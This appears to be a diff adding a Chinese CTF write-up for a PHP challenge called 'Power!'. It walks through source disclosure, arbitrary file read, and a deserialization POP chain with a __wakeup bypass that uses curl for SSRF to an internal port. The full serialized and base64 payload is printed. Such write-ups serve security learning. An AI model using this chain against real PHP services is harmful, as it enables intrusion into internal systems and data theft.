@@ -821,3 +821,217 @@ http://node1.anna.nssctf.cn:28157/upload/9b19628b659a4d6b0c83a8eed31c80c4/1234.p
 ```
 
 可以得到 flag 。
+
+### Power!
+
+源代码存在提示如下
+
+```html
+<!-- ?source= -->
+```
+
+构造 Payload 如下
+
+```
+source=index.php
+```
+
+可以得到 `index.php` 的源代码
+
+```php
+<?php
+    class FileViewer{
+        public $black_list = "flag";
+        public $local = "http://127.0.0.1/";
+        public $path;
+        public function __call($f,$a){
+            $this->loadfile();
+        }
+        public function loadfile(){
+            if(!is_array($this->path)){
+                if(preg_match("/".$this->black_list."/i",$this->path)){
+                    $file = $this->curl($this->local."cheems.jpg");
+                }else{
+                    $file = $this->curl($this->local.$this->path);
+                }
+            }else{
+                $file = $this->curl($this->local."cheems.jpg");
+            }
+            echo '<img src="data:jpg;base64,'.base64_encode($file).'"/>';
+        }
+        public function curl($path){
+            $url = $path;
+            $curl = curl_init();
+            curl_setopt($curl, CURLOPT_URL, $url);
+            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($curl, CURLOPT_HEADER, 0);
+            $response = curl_exec($curl);
+            curl_close($curl);
+            return $response;
+        }
+        public function __wakeup(){
+            $this->local = "http://127.0.0.1/";
+        }
+    }
+    class Backdoor{
+        public $a;
+        public $b;
+        public $superhacker = "hacker.jpg";
+        public function goodman($i,$j){
+            $i->$j = $this->superhacker;
+        }
+        public function __destruct(){
+            $this->goodman($this->a,$this->b);
+            $this->a->c();
+        }
+    }
+    if(isset($_GET['source'])){
+        highlight_file(__FILE__);
+    }else{
+        if(isset($_GET['image_path'])){
+            $path = $_GET['image_path'];    //flag in /flag.php
+            if(is_string($path)&&!preg_match("/http:|gopher:|glob:|php:/i",$path)){
+                echo '<img src="data:jpg;base64,'.base64_encode(file_get_contents($path)).'"/>';
+            }else{
+                echo '<h2>Seriously??</h2><img src="data:jpg;base64,'.base64_encode(file_get_contents("cheems.jpg")).'"/>';
+            }
+            
+        }else if(isset($_GET['path_info'])){
+            $path_info = $_GET['path_info'];
+            $FV = unserialize(base64_decode($path_info));
+            $FV->loadfile();
+        }else{
+            $path = "vergil.jpg";
+            echo '<h2>POWER!!</h2>
+            <img src="data:jpg;base64,'.base64_encode(file_get_contents($path)).'"/>';
+        }
+    }
+?>
+```
+
+构造 Payload 如下
+
+```
+image_path=flag.php
+```
+
+可以得到 `flag.php` 的源码如下
+
+```php
+<?php
+$a = "good job,but there is no flag
+i put my flag in intranet(127.0.0.1:65500)
+outsider have no permissions to get it
+if you want it,then you have to take it
+but you already knew the rules
+try it";
+?>
+```
+
+因此需要通过 curl 方法来从内网获取到 flag，链子如下
+
+```
+Backdoor::__destruct()->FileViewer::__call()->FileViewer::loadfile()->FileViewer::curl()
+```
+
+构造序列化如下
+
+```php
+<?php
+class FileViewer{
+  public $black_list = "flag";
+  public $local = "http://127.0.0.1/";
+  public $path;
+  public function __call($f,$a){
+    $this->loadfile();
+  }
+  public function loadfile(){
+    if(!is_array($this->path)){
+      if(preg_match("/".$this->black_list."/i",$this->path)){
+        $file = $this->curl($this->local."cheems.jpg");
+      }else{
+        $file = $this->curl($this->local.$this->path);
+      }
+    }else{
+      $file = $this->curl($this->local."cheems.jpg");
+    }
+    echo '<img src="data:jpg;base64,'.base64_encode($file).'"/>';
+  }
+  public function curl($path){
+    $url = $path;
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($curl, CURLOPT_HEADER, 0);
+    $response = curl_exec($curl);
+    curl_close($curl);
+    return $response;
+  }
+  public function __wakeup(){
+    $this->local = "http://127.0.0.1/";
+  }
+}
+class Backdoor{
+  public $a;
+  public $b;
+  public $superhacker = "hacker.jpg";
+  public function goodman($i,$j){
+    $i->$j = $this->superhacker; // $fv->local = 'http://127.0.0.1:65500/'
+  }
+  public function __destruct(){
+    $this->goodman($this->a,$this->b);
+    $this->a->c(); // $fv::__call()
+  }
+}
+if(isset($_GET['source'])){
+  highlight_file(__FILE__);
+}else{
+  if(isset($_GET['image_path'])){
+    $path = $_GET['image_path'];    //flag in /flag.php
+    if(is_string($path)&&!preg_match("/http:|gopher:|glob:|php:/i",$path)){
+      echo '<img src="data:jpg;base64,'.base64_encode(file_get_contents($path)).'"/>';
+    }else{
+      echo '<h2>Seriously??</h2><img src="data:jpg;base64,'.base64_encode(file_get_contents("cheems.jpg")).'"/>';
+    }
+
+  }else if(isset($_GET['path_info'])){
+    $path_info = $_GET['path_info'];
+    $FV = unserialize(base64_decode($path_info));
+    $FV->loadfile();
+  }else{
+    $path = "vergil.jpg";
+    echo '<h2>POWER!!</h2>
+            <img src="data:jpg;base64,'.base64_encode(file_get_contents($path)).'"/>';
+  }
+}
+
+$bd = new Backdoor();
+$fv = new FileViewer();
+$fv->path = 'flag.php';
+$fv->black_list = 'k1s4ra';
+$bd->superhacker = 'http://127.0.0.1:65500/';
+$bd->a = $fv;
+$bd->b = 'local';
+echo serialize($bd);
+// O:8:"Backdoor":3:{s:1:"a";O:10:"FileViewer":3:{s:10:"black_list";s:6:"k1s4ra";s:5:"local";s:17:"http://127.0.0.1/";s:4:"path";s:8:"flag.php";}s:1:"b";s:5:"local";s:11:"superhacker";s:23:"http://127.0.0.1:65500/";}
+```
+
+需要绕过 `__wakeup()` 魔术方法，所以需要修改对象属性个数，序列化变为
+
+```
+O:8:"Backdoor":4:{s:1:"a";O:10:"FileViewer":3:{s:10:"black_list";s:6:"k1s4ra";s:5:"local";s:17:"http://127.0.0.1/";s:4:"path";s:8:"flag.php";}s:1:"b";s:5:"local";s:11:"superhacker";s:23:"http://127.0.0.1:65500/";}
+```
+
+再进行 base64 编码就得到最后的 Payload 如下
+
+```
+Tzo4OiJCYWNrZG9vciI6NDp7czoxOiJhIjtPOjEwOiJGaWxlVmlld2VyIjozOntzOjEwOiJibGFja19saXN0IjtzOjY6ImsxczRyYSI7czo1OiJsb2NhbCI7czoxNzoiaHR0cDovLzEyNy4wLjAuMS8iO3M6NDoicGF0aCI7czo4OiJmbGFnLnBocCI7fXM6MToiYiI7czo1OiJsb2NhbCI7czoxMToic3VwZXJoYWNrZXIiO3M6MjM6Imh0dHA6Ly8xMjcuMC4wLjE6NjU1MDAvIjt9
+```
+
+得到回显如下
+
+```
+TlNTQ1RGe2E0NDNjZDEwLTA1MzctNDBlMC1hYWEyLTAyZjhhNjU4ZmEzZX0=
+```
+
+通过 base64 解码即可获得 flag 。
